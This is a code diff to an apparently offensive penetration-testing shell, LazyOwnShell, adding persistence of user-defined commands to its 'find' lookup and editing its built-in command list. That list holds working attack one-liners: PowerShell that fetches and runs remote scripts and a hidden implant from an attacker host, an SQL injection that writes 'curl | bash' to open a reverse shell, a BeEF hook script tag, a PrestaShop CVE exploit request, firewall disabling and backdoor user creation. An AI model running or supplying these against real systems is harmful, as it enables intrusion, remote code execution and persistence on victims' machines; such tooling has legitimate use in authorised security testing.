@@ -590,6 +590,30 @@ class LazyOwnShell(cmd2.Cmd):
         """
         print_warn("You didn't enter any command.")
 
+    def load_user_commands(self):
+        """Carga los comandos personalizados desde user_commands.json"""
+        filepath = "user_commands.json"
+        if not os.path.exists(filepath):
+            return []
+        try:
+            with open(filepath, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            print_error(f"Error loading user commands: {e}")
+            return []
+
+    def save_user_command(self, alias, command):
+        """Guarda un nuevo comando en user_commands.json"""
+        filepath = "user_commands.json"
+        commands = self.load_user_commands()
+        commands.append([alias, command])  # Guardamos como [alias, command] para compatibilidad
+        try:
+            with open(filepath, 'w') as f:
+                json.dump(commands, f, indent=4)
+            print_msg(f"✅ Command '{alias}' saved successfully!")
+        except Exception as e:
+            print_error(f"Error saving command: {e}")
+
     def list_files_in_directory(self, directory):
         """Lista todos los archivos en un directorio dado."""
         if not os.path.exists(directory):
@@ -6429,6 +6453,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN set lhost as TrustedHost", f"Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"{lhost}\" -Force"),
             ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
             ("WIN domain trust", "nltest /domain_trusts"),
             ("WIN check relationship", "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"),
@@ -6465,7 +6490,6 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN SSH get state", "Get-Service -Name sshd"),
             ("WIN run dll netsh", "netsh add helper C:\\users\\grisun0\\documents\\netshhelper.dll ; netsh"),
             ("WIN ARP Table", "arp -a"),
-            ("BRO Beef Payload", f"<script src=\"http://{lhost}:3000/hook.js\"></script>"),
             ("WIN Screenshot", "Add-Type -AssemblyName System.Windows.Forms"),
             ("WIN Disable Firewall", "netsh advfirewall set allprofiles state off"),
             ("WIN new user", "net user lazyown Lazy#Password123 /add"),
@@ -6518,12 +6542,19 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
             ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
             ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""'),
+            ("WEB Beef Payload", f"<script src=\"http://{lhost}:3000/hook.js\"></script>"),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b "),
             ("WEB Prestashop CVE-2020-16194", f"curl -s -k -X $'POST' --data-binary $'opart_devis_customer_id=-1&delivery_address=1&invoice_address=0&opart_devis_carrier_input=1&selected_carrier=0' $'http://{rhost}/index.php?fc=module&module=opartdevis&controller=createquotation&change_carrier_cart' ")
         ]
+
+        # Cargar comandos del usuario
+        user_commands = self.load_user_commands()
+
+        # Combinar ambos
+        commands_list = commands_list + user_commands
 
         filtered_commands = [(alias, cmd) for alias, cmd in commands_list if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else commands_list
 
@@ -27341,6 +27372,63 @@ class LazyOwnShell(cmd2.Cmd):
         self.display_toastr("🔐 Custom and built-in aliases:")
         for name, cmd in sorted(self.aliases.items()):
             print_msg(f"  {name:20} → {cmd}")
+
+    @cmd2.with_category(post_exploitation_category)
+    def do_add2find(self, line=""):
+        """
+        Add a new custom command to the 'find' system, saved in user_commands.json.
+
+        Usage: add2find
+        You will be prompted for:
+        - Alias (descriptive name)
+        - Command (the actual shell/command to execute)
+
+        Example:
+        Alias: LIN My Custom Recon
+        Command: find / -name "*.log" 2>/dev/null
+
+        The command will be available in 'find' immediately and persist across sessions.
+        """
+        alias = input("Enter alias (e.g., 'LIN My Custom Script'): ").strip()
+        if not alias:
+            print_error("Alias cannot be empty.")
+            return
+
+        command = input("Enter command: ").strip()
+        if not command:
+            print_error("Command cannot be empty.")
+            return
+
+        self.save_user_command(alias, command)
+
+    @cmd2.with_category(post_exploitation_category)
+    def do_rmfromfind(self, line):
+        """
+        Remove a custom command by index (as shown in 'find').
+
+        Only removes user-added commands (not defaults).
+        """
+        user_commands = self.load_user_commands()
+        if not user_commands:
+            print_msg("No custom commands to remove.")
+            return
+
+        print_msg("Custom commands (user-added):")
+        for i, (alias, cmd) in enumerate(user_commands):
+            print(f"  {i+1}. {alias} → {cmd}")
+
+        try:
+            idx = int(input("Enter number to delete: ")) - 1
+            if 0 <= idx < len(user_commands):
+                removed = user_commands.pop(idx)
+                filepath = "user_commands.json"
+                with open(filepath, 'w') as f:
+                    json.dump(user_commands, f, indent=4)
+                print_msg(f"🗑️ Removed: {removed[0]}")
+            else:
+                print_error("Invalid index.")
+        except ValueError:
+            print_error("Please enter a number.")
 
 def main():
     p = LazyOwnShell()
